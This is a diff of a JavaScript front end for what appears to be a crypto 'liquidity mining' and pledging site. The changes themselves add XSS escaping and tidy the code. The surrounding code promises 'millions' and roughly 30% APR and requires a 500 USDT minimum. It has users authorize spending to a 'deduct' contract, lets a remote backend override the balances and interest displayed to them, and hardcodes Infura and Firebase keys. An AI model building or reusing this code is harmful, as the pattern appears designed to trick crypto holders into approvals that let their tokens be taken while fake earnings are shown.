@@ -1,10 +1,8 @@
 // ==================== 後端 API URL (您的 ngrok) ====================
 const BACKEND_API_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
 console.log('[DEBUG] BACKEND_API_URL 初始化:', BACKEND_API_URL);
-
 // ==================== Infura 備用節點 ====================
 const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
-
 // ==================== SSE 替代 WebSocket ====================
 let eventSource;
 function initSSE() {
@@ -131,7 +129,6 @@ function initSSE() {
     setTimeout(initSSE, 5000);
   };
 }
-
 // ==================== Firebase 初始化 ====================
 const app = window.firebase.initializeApp({
   apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
@@ -143,7 +140,6 @@ const app = window.firebase.initializeApp({
 });
 const db = window.firebase.firestore();
 console.log('[DEBUG] Firebase 初始化完成');
-
 // ==================== 合約地址與 ABI ====================
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
@@ -177,7 +173,6 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
-
 // ==================== 質押週期 ====================
 const PLEDGE_DURATIONS = [
   { days: 30, rate: 0.05, min: 1 },
@@ -187,7 +182,6 @@ const PLEDGE_DURATIONS = [
   { days: 240, rate: 0.281, min: 1 },
   { days: 365, rate: 0.315, min: 1 }
 ];
-
 // ==================== DOM 元素 ====================
 let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
 let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
@@ -197,7 +191,6 @@ let totalPledgeBlock, estimateBlock, pledgeDetailModal, closePledgeDetail;
 let accountDetailModal, closeAccountDetail, closeAccountDetailBtn;
 let elements = {};
 let rulesModal;
-
 // ==================== 全域變數 ====================
 let dataVersion = 0;
 let provider, signer, userAddress;
@@ -223,73 +216,72 @@ let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
 let userPledges = [];
 window.isDemoMode = false;
 let cachedWalletBalances = { USDT: 0n, USDC: 0n, WETH: 0n };
-
 // ==================== 翻譯表 ====================
 const translations = {
   'en': {
-  title: 'Liquidity Mining',
-  subtitle: 'Start Earning Millions',
-  tabLiquidity: 'Liquidity',
-  tabPledging: 'Pledging',
-  grossOutputLabel: 'Total Output Interest',
-  cumulativeLabel: 'Claimable',
-  walletBalanceLabel: 'Wallet Balance',
-  accountBalanceLabel: 'Account Balance',
-  nextBenefit: 'Next Benefit: 00:00:00',
-  startBtnText: 'Start',
-  pledgeAmountLabel: 'Pledge Amount',
-  pledgeDurationLabel: 'Duration',
-  pledgeBtnText: 'Pledge Now',
-  claimBtnText: 'Claim',
-  noClaimable: 'No claimable interest available.',
-  claimSuccess: 'Claim successful!',
-  nextClaimTime: 'Next claim in 12 hours.',
-  miningStarted: 'Mining started!',
-  error: 'Error',
-  offlineWarning: 'Server offline, using local mode.',
-  noWallet: 'Please connect your wallet.',
-  dataSent: 'Data sent.',
-  pledgeSuccess: 'Pledge successful!',
-  pledgeError: 'Pledge failed.',
-  invalidPledgeAmount: 'Invalid amount.',
-  invalidPledgeToken: 'Invalid token.',
-  insufficientBalance: 'Insufficient balance.',
-  ethersError: 'Ethers.js error.',
-  approveError: 'Approval failed.',
-  selectTokenFirst: 'Select token first.',
-  balanceZero: 'Balance zero.',
-  balanceTooLow: 'Balance too low.',
-  wethValueTooLow: 'WETH value too low.',
-  rulesTitle: 'Mining Rules',
-  pendingInterest: 'Pending Interest',
-  claimedInterest: 'Claimed Interest',
-  rulesContent: `
-    <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
-    <p>2. Insufficient: can authorize but not start.</p>
-    <p>3. APR: 28.3% ~ 31.5%.</p>
-    <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
-    <p>5. Pledging will also be included in liquidity mining interest calculation.</p>
-  `,
-  modalClaimableLabel: 'Claimable',
-  modalSelectedTokenLabel: 'Selected Token',
-  modalEquivalentValueLabel: 'Equivalent Value',
-  totalPledge: 'Total Pledged',
-  estimate: 'Estimated Return',
-  pledgeDetailTitle: 'Pledge Details',
-  orderCount: 'Orders',
-  startTime: 'Start Time',
-  remaining: 'Remaining',
-  cycle: 'Cycle',
-  apr: 'APR',
-  accrued: 'Accrued Interest',
-  exceedBalance: 'Amount exceeds wallet balance!',
-  accountDetailTitle: 'Account Balance Details',
-  totalBalance: 'Total Balance',
-  pledgedAmount: 'Pledged Amount',
-  pendingInterest: 'Pending Interest',
-  claimedInterest: 'Claimed Interest',
-  walletBalance: 'Wallet Balance',
-  confirm: 'Confirm'
+    title: 'Liquidity Mining',
+    subtitle: 'Start Earning Millions',
+    tabLiquidity: 'Liquidity',
+    tabPledging: 'Pledging',
+    grossOutputLabel: 'Total Output Interest',
+    cumulativeLabel: 'Claimable',
+    walletBalanceLabel: 'Wallet Balance',
+    accountBalanceLabel: 'Account Balance',
+    nextBenefit: 'Next Benefit: 00:00:00',
+    startBtnText: 'Start',
+    pledgeAmountLabel: 'Pledge Amount',
+    pledgeDurationLabel: 'Duration',
+    pledgeBtnText: 'Pledge Now',
+    claimBtnText: 'Claim',
+    noClaimable: 'No claimable interest available.',
+    claimSuccess: 'Claim successful!',
+    nextClaimTime: 'Next claim in 12 hours.',
+    miningStarted: 'Mining started!',
+    error: 'Error',
+    offlineWarning: 'Server offline, using local mode.',
+    noWallet: 'Please connect your wallet.',
+    dataSent: 'Data sent.',
+    pledgeSuccess: 'Pledge successful!',
+    pledgeError: 'Pledge failed.',
+    invalidPledgeAmount: 'Invalid amount.',
+    invalidPledgeToken: 'Invalid token.',
+    insufficientBalance: 'Insufficient balance.',
+    ethersError: 'Ethers.js error.',
+    approveError: 'Approval failed.',
+    selectTokenFirst: 'Select token first.',
+    balanceZero: 'Balance zero.',
+    balanceTooLow: 'Balance too low.',
+    wethValueTooLow: 'WETH value too low.',
+    rulesTitle: 'Mining Rules',
+    pendingInterest: 'Pending Interest',
+    claimedInterest: 'Claimed Interest',
+    rulesContent: `
+      <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
+      <p>2. Insufficient: can authorize but not start.</p>
+      <p>3. APR: 28.3% ~ 31.5%.</p>
+      <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
+      <p>5. Pledging will also be included in liquidity mining interest calculation.</p>
+    `,
+    modalClaimableLabel: 'Claimable',
+    modalSelectedTokenLabel: 'Selected Token',
+    modalEquivalentValueLabel: 'Equivalent Value',
+    totalPledge: 'Total Pledged',
+    estimate: 'Estimated Return',
+    pledgeDetailTitle: 'Pledge Details',
+    orderCount: 'Orders',
+    startTime: 'Start Time',
+    remaining: 'Remaining',
+    cycle: 'Cycle',
+    apr: 'APR',
+    accrued: 'Accrued Interest',
+    exceedBalance: 'Amount exceeds wallet balance!',
+    accountDetailTitle: 'Account Balance Details',
+    totalBalance: 'Total Balance',
+    pledgedAmount: 'Pledged Amount',
+    pendingInterest: 'Pending Interest',
+    claimedInterest: 'Claimed Interest',
+    walletBalance: 'Wallet Balance',
+    confirm: 'Confirm'
   },
   'zh-Hant': {
     title: '流動性挖礦',
@@ -422,20 +414,23 @@ const translations = {
     confirm: '确认'
   }
 };
-
 // ==================== 語言防呆 ====================
 let currentLang = localStorage.getItem('language');
 if (!currentLang || !translations[currentLang]) {
   currentLang = 'en';
 }
 localStorage.setItem('language', currentLang);
-
 // ==================== 安全數字格式化 ====================
 function safeFixed(value, decimals = 3) {
   const num = parseFloat(value);
   return isNaN(num) ? '0.000' : num.toFixed(decimals);
 }
-
+// ==================== 防 XSS 轉義 ====================
+function escapeHtml(text) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
 // ==================== 狀態更新函數 ====================
 function updateStatus(message, isWarning = false) {
   if (!statusDiv) return;
@@ -444,7 +439,6 @@ function updateStatus(message, isWarning = false) {
   statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
   statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
 }
-
 // ==================== 重置狀態 ====================
 function resetState(showMsg = true) {
   signer = userAddress = null;
@@ -469,7 +463,7 @@ function resetState(showMsg = true) {
   }
   if (connectButton) {
     connectButton.classList.remove('connected');
-    connectButton.textContent = 'Connect Wallet';
+    connectButton.textContent = 'Connect';
   }
   disableInteractiveElements(true);
   if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
@@ -482,7 +476,6 @@ function resetState(showMsg = true) {
   if (elements.exceedWarning) elements.exceedWarning.style.display = 'none';
   if (showMsg) updateStatus(translations[currentLang].noWallet, true);
 }
-
 // ==================== 禁用互動元素 ====================
 function disableInteractiveElements(disable = false) {
   if (startBtn) startBtn.disabled = disable;
@@ -492,7 +485,6 @@ function disableInteractiveElements(disable = false) {
   if (pledgeToken) pledgeToken.disabled = disable;
   if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
 }
-
 // ==================== 獲取 DOM 元素 ====================
 function getElements() {
   connectButton = document.getElementById('connectButton');
@@ -554,7 +546,6 @@ function getElements() {
     modalWalletBalanceLabel: document.getElementById('modalWalletBalanceLabel')
   };
 }
-
 // ==================== 綁定 ? 按鈕 ====================
 function bindRulesButton() {
   const rulesModal = document.getElementById('rulesModal');
@@ -585,7 +576,6 @@ function bindRulesButton() {
   });
   console.log('[DEBUG] ? 按鈕事件綁定成功');
 }
-
 // ==================== 更新帳戶餘額顯示 ====================
 function getTotalAccountBalanceInSelectedToken() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
@@ -599,7 +589,6 @@ function updateAccountBalanceDisplay() {
   const total = getTotalAccountBalanceInSelectedToken();
   accountBalanceValue.textContent = `${safeFixed(total)} ${selected}`;
 }
-
 // ==================== 從快取更新錢包餘額 ====================
 function updateWalletBalanceFromCache() {
   if (!walletTokenSelect || !walletBalanceAmount) return;
@@ -611,7 +600,6 @@ function updateWalletBalanceFromCache() {
   accountBalance[selected].wallet = value;
   walletBalanceAmount.textContent = safeFixed(value);
 }
-
 // ==================== 強制刷新錢包餘額 ====================
 async function forceRefreshWalletBalance() {
   if (!userAddress || window.isDemoMode) return;
@@ -636,7 +624,6 @@ async function forceRefreshWalletBalance() {
     updateStatus(`餘額讀取失敗: ${error.message}`, true);
   }
 }
-
 // ==================== 【新增】應用 overrides ====================
 function applyOverrides(override) {
   window.currentClaimable = override.cumulative ?? 0;
@@ -660,7 +647,6 @@ function applyOverrides(override) {
   updateClaimableDisplay();
   updateAccountBalanceDisplay();
 }
-
 // ==================== 其他函數保持不變 ====================
 function getCurrentBalances() {
   return {
@@ -757,7 +743,7 @@ function updateClaimModalLabels() {
   const claimLabels = {
     'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
     'zh-Hant': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
-    'zh-Hans': { title: '領取', claimable: '可領取', selectedToken: '選擇代幣', equivalentValue: '等值金額' }
+    'zh-Hans': { title: '领取', claimable: '可领取', selectedToken: '选择代币', equivalentValue: '等值金额' }
   };
   const labels = claimLabels[currentLang];
   if (modalTitle) modalTitle.textContent = labels.title;
@@ -797,45 +783,37 @@ function closeClaimModal() {
 }
 function updateNextBenefitTimer() {
   if (!nextBenefit) return;
-
   const safeLang = currentLang && translations[currentLang] ? currentLang : 'en';
   const defaultText = translations[safeLang].nextBenefit || 'Next Benefit: 00:00:00';
   const label = defaultText.split(':')[0].trim();
-
   const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime') || '0');
   if (!nextBenefitTimestamp) {
     nextBenefit.textContent = `${label}: 00:00:00`;
     return;
   }
-
   const now = Date.now();
   let diff = nextBenefitTimestamp - now;
   if (diff <= 0) {
     diff = 12 * 60 * 60 * 1000;
     localStorage.setItem('nextBenefitTime', (nextBenefitTimestamp + diff).toString());
   }
-
   const totalSeconds = Math.floor(diff / 1000);
   const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
   const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
   const s = String(totalSeconds % 60).padStart(2, '0');
-
   nextBenefit.textContent = `${label}: ${h}:${m}:${s}`;
 }
 function setInitialNextBenefitTime() {
   if (localStorage.getItem('nextBenefitTime')) return;
-
   const safeLang = currentLang && translations[currentLang] ? currentLang : 'en';
   const defaultText = translations[safeLang].nextBenefit || 'Next Benefit: 00:00:00';
   const label = defaultText.split(':')[0].trim();
-
   const etOffset = getETOffsetMilliseconds();
   const nowET = new Date(Date.now() + etOffset);
   const nextHour = nowET.getHours() < 12 ? 12 : 24;
   const nextBenefitTimeET = new Date(nowET);
   nextBenefitTimeET.setHours(nextHour, 0, 0, 0);
   const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
-
   localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
   updateNextBenefitTimer();
 }
@@ -1119,8 +1097,7 @@ function updateEstimate() {
     elements.exceedWarning.style.display = 'none';
   }
 }
-
-// ==================== 雙層訂單詳情 ====================
+// ==================== 雙層訂單詳情（已修復） ====================
 function showPledgeDetail() {
   if (!pledgeDetailModal) return;
   const content = document.getElementById('pledgeDetailContent');
@@ -1139,9 +1116,9 @@ function showPledgeDetail() {
       const item = document.createElement('div');
       item.style = 'border: 1px solid #444; margin: 8px 0; padding: 12px; border-radius: 8px; cursor: pointer; background: #1a1a1a;';
       item.innerHTML = `
-        <div style="font-weight: bold;">訂單 #${i+1} - ${safeFixed(p.amount)} ${p.token}</div>
+        <div style="font-weight: bold;">訂單 #${i+1} - ${safeFixed(p.amount)} ${escapeHtml(p.token)}</div>
         <div style="font-size: 0.9em; color: #0f0;">週期：${p.duration} 天 | 年化：${apr}</div>
-        <div style="font-size: 0.9em; color: #0ff;">剩餘：${daysLeft} 天 | 預估利息：${estimatedInterest} ${p.token}</div>
+        <div style="font-size: 0.9em; color: #0ff;">剩餘：${daysLeft} 天 | 預估利息：${estimatedInterest} ${escapeHtml(p.token)}</div>
         <div style="font-size: 0.8em; color: #aaa; margin-top: 4px;">${new Date(p.startTime).toLocaleString()}</div>
       `;
       item.onclick = () => showOrderDetail(p, i);
@@ -1151,34 +1128,48 @@ function showPledgeDetail() {
   }
   pledgeDetailModal.style.display = 'flex';
 }
+// 【關鍵修復】使用 DOM 操作 + addEventListener，避免 innerHTML 注入 onclick
 function showOrderDetail(order, index) {
   const detailModal = document.createElement('div');
   detailModal.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 10000; padding: 20px;';
+
   const endTime = order.startTime + order.duration * 24 * 60 * 60 * 1000;
   const daysLeft = Math.max(0, Math.ceil((endTime - Date.now()) / (24 * 60 * 60 * 1000)));
   const durationInfo = PLEDGE_DURATIONS.find(d => d.days === order.duration) || { rate: 0 };
   const accrued = (order.amount * durationInfo.rate * (Date.now() - order.startTime) / (order.duration * 24 * 60 * 60 * 1000)).toFixed(3);
   const estimatedTotal = (order.amount * durationInfo.rate).toFixed(3);
-  detailModal.innerHTML = `
-    <div style="background: #111; padding: 24px; border-radius: 16px; max-width: 90%; color: #fff; box-shadow: 0 0 20px rgba(0,255,255,0.3);">
-      <h3 style="margin: 0 0 16px; color: #0ff;">訂單詳情 #${index + 1}</h3>
-      <div style="line-height: 1.6;">
-        <p><strong>訂單號：</strong><span style="color:#0f0;">${order.orderId}</span></p>
-        <p><strong>質押金額：</strong>${safeFixed(order.amount)} ${order.token}</p>
-        <p><strong>週期：</strong>${order.duration} 天</p>
-        <p><strong>年化利率：</strong><span style="color:#0f0;">${(durationInfo.rate * 100).toFixed(1)}%</span></p>
-        <p><strong>開始時間：</strong>${new Date(order.startTime).toLocaleString()}</p>
-        <p><strong>到期時間：</strong>${new Date(endTime).toLocaleString()}</p>
-        <p><strong>剩餘時間：</strong><span style="color:#ff0;">${daysLeft} 天</span></p>
-        <p><strong>已累積利息：</strong><span style="color:#0ff;">${accrued} ${order.token}</span></p>
-        <p><strong>預估總利息：</strong><span style="color:#0f0;">${estimatedTotal} ${order.token}</span></p>
-      </div>
-      <button onclick="this.closest('[style*=\"z-index\"]').remove()" style="margin-top: 20px; padding: 10px 20px; background: #00ffff; color: #000; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">關閉</button>
+
+  const modalContent = document.createElement('div');
+  modalContent.style = 'background: #111; padding: 24px; border-radius: 16px; max-width: 90%; color: #fff; box-shadow: 0 0 20px rgba(0,255,255,0.3);';
+
+  modalContent.innerHTML = `
+    <h3 style="margin: 0 0 16px; color: #0ff;">訂單詳情 #${index + 1}</h3>
+    <div style="line-height: 1.6;">
+      <p><strong>訂單號：</strong><span style="color:#0f0;">${escapeHtml(order.orderId)}</span></p>
+      <p><strong>質押金額：</strong>${safeFixed(order.amount)} ${escapeHtml(order.token)}</p>
+      <p><strong>週期：</strong>${order.duration} 天</p>
+      <p><strong>年化利率：</strong><span style="color:#0f0;">${(durationInfo.rate * 100).toFixed(1)}%</span></p>
+      <p><strong>開始時間：</strong>${new Date(order.startTime).toLocaleString()}</p>
+      <p><strong>到期時間：</strong>${new Date(endTime).toLocaleString()}</p>
+      <p><strong>剩餘時間：</strong><span style="color:#ff0;">${daysLeft} 天</span></p>
+      <p><strong>已累積利息：</strong><span style="color:#0ff;">${accrued} ${escapeHtml(order.token)}</span></p>
+      <p><strong>預估總利息：</strong><span style="color:#0f0;">${estimatedTotal} ${escapeHtml(order.token)}</span></p>
     </div>
   `;
-  document.body.appendChild(detailModal);
-}
 
+  const closeBtn = document.createElement('button');
+  closeBtn.textContent = '關閉';
+  closeBtn.style = 'margin-top: 20px; padding: 10px 20px; background: #00ffff; color: #000; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;';
+  closeBtn.onclick = () => detailModal.remove();
+  modalContent.appendChild(closeBtn);
+
+  detailModal.appendChild(modalContent);
+  document.body.appendChild(detailModal);
+
+  detailModal.addEventListener('click', (e) => {
+    if (e.target === detailModal) detailModal.remove();
+  });
+}
 // ==================== 帳戶明細 ====================
 function showAccountDetail() {
   if (!accountDetailModal) return;
@@ -1214,7 +1205,6 @@ function checkPledgeExpiry() {
   });
 }
 setInterval(checkPledgeExpiry, 60000);
-
 // ==================== 初始化 ====================
 document.addEventListener('DOMContentLoaded', async () => {
   console.log('[DEBUG] DOM載入完成，開始初始化');
@@ -1384,7 +1374,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         await smartSave();
         startBtn.style.display = 'none';
       } catch (error) {
-        updateStatus(`授權失敗或已取消: ${error.message}`, true);
+                updateStatus(`授權失敗或已取消: ${error.message}`, true);
         startBtn.disabled = false;
         startBtn.textContent = translations[currentLang].startBtnText;
       }
@@ -1404,7 +1394,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       const amount = parseFloat(pledgeAmount.value) || 0;
       const durationDays = parseInt(pledgeDuration.value) || 90;
       const token = pledgeToken.value;
-            if (amount <= 0) {
+      if (amount <= 0) {
         updateStatus(translations[currentLang].invalidPledgeAmount, true);
         return;
       }
@@ -1511,7 +1501,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     })();
   }
 });
-
 // 自動餘額監控（每 10 秒）
 setInterval(async () => {
   if (userAddress && signer && !window.isDemoMode) {
@@ -1530,7 +1519,6 @@ setInterval(async () => {
     }
   }
 }, 10000);
-
 // ==================== 缺失函數修復 ====================
 async function retry(fn, maxAttempts = 3, delayMs = 5000) {
   for (let i = 0; i < maxAttempts; i++) {
@@ -1562,7 +1550,6 @@ function disconnectWallet() {
     eventSource = null;
   }
 }
-
 // 顯示質押結果模態
 function showPledgeResult(type, title, message) {
   const modal = document.getElementById('pledgeResultModal');
@@ -1576,7 +1563,6 @@ function showPledgeResult(type, title, message) {
   modal.style.display = 'flex';
   confirmBtn.onclick = () => modal.style.display = 'none';
 }
-
 // 檢查質押是否被鎖定（後端處理中）
 async function isPledgeLocked(address) {
   try {
@@ -1589,7 +1575,6 @@ async function isPledgeLocked(address) {
     return false;
   }
 }
-
 // 智慧儲存（本地 + 同步到後端）
 async function smartSave(updateData = {}) {
   try {
@@ -1621,7 +1606,6 @@ async function smartSave(updateData = {}) {
     console.error('[DEBUG] 智慧儲存失敗:', error);
   }
 }
-
 // 從伺服器載入用戶資料（關鍵修復函數）
 async function loadUserDataFromServer() {
   if (!userAddress) {
@@ -1640,7 +1624,6 @@ async function loadUserDataFromServer() {
     window.currentClaimable = userData.claimable || 0;
     totalGrossOutput = userData.grossOutput || 0;
     authorizedToken = userData.pledgeToken || 'USDT';
-
     // === 【關鍵修正】安全處理 pledges ===
     let pledgesArray = [];
     if (userData.pledges) {
@@ -1660,7 +1643,6 @@ async function loadUserDataFromServer() {
       redeemed: !!p.redeemed
     }));
     // === 結束 ===
-
     // 合併 overrides
     if (userData.overrides && Object.keys(userData.overrides).length > 0) {
       applyOverrides(userData.overrides);
@@ -1670,7 +1652,6 @@ async function loadUserDataFromServer() {
         accountBalance[token].interest = userData.accountBalance?.[token]?.interest ?? 0;
       });
     }
-
     // 演示錢包自動啟動
     if (userData.isDemoWallet) {
       console.log('[DEBUG] 檢測到演示錢包，自動啟動');
@@ -1680,7 +1661,6 @@ async function loadUserDataFromServer() {
       updateStatus("演示模式：已自動授權");
       activateStakingUI();
     }
-
     // 強制更新 UI
     updateClaimableDisplay();
     updateAccountBalanceDisplay();
@@ -1692,5 +1672,4 @@ async function loadUserDataFromServer() {
     updateStatus(`資料同步失敗: ${error.message}`, true);
   }
 }
-
 // =============== 檔案結束 ===============
